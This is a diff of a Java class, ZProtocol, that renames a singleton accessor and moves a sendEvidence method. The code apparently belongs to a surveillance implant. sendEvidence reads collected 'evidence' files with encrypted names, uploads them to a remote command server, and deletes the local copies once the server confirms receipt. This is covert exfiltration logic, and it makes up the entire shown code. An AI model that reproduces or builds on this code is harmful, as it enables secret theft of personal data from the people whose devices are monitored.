@@ -697,7 +697,7 @@ public class ZProtocol extends Protocol {
 						Check.log(TAG + " (parseNewConf): RELOADING"); //$NON-NLS-1$
 					}
 					// status.reload = true;
-					ret = Core.getInstance().reloadConf();
+					ret = Core.self().reloadConf();
 				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (parseNewConf): ERROR RELOADING"); //$NON-NLS-1$
@@ -1090,6 +1090,42 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
+	private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
+		final byte[] content = file.read();
+	
+		if (content == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: File is empty: " + file); //$NON-NLS-1$
+			}
+	
+			return true;
+		}
+	
+		if (Cfg.DEBUG) {
+			Check.log(TAG
+					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
+		}
+	
+		final byte[] plainOut = new byte[content.length + 4];
+	
+		System.arraycopy(ByteArray.intToByteArray(content.length), 0, plainOut, 0, 4);
+		System.arraycopy(content, 0, plainOut, 4, content.length);
+	
+		byte[] response = command(Proto.EVIDENCE, plainOut);
+		final boolean ret = parseLog(response);
+	
+		if (ret) {
+			EvidenceCollector.self().remove(file.getFilename());
+			return true;
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+	
+			return false;
+		}
+	}
+
 	private boolean sendResumeEvidence(AutoFile file) throws TransportException, ProtocolException {
 		int chunk = Cfg.PROTOCOL_CHUNK;
 		int size = (int) file.getSize();
@@ -1171,42 +1207,6 @@ public class ZProtocol extends Protocol {
 
 	private void writeBuf(byte[] buffer, int pos, byte[] whatever, int offset, int len) {
 		System.arraycopy(whatever, offset, buffer, pos, len);
-	}
-
-	private boolean sendEvidence(AutoFile file) throws TransportException, ProtocolException {
-		final byte[] content = file.read();
-
-		if (content == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: File is empty: " + file); //$NON-NLS-1$
-			}
-
-			return true;
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG
-					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
-		}
-
-		final byte[] plainOut = new byte[content.length + 4];
-
-		System.arraycopy(ByteArray.intToByteArray(content.length), 0, plainOut, 0, 4);
-		System.arraycopy(content, 0, plainOut, 4, content.length);
-
-		byte[] response = command(Proto.EVIDENCE, plainOut);
-		final boolean ret = parseLog(response);
-
-		if (ret) {
-			EvidenceCollector.self().remove(file.getFilename());
-			return true;
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
-			}
-
-			return false;
-		}
 	}
 
 	/**
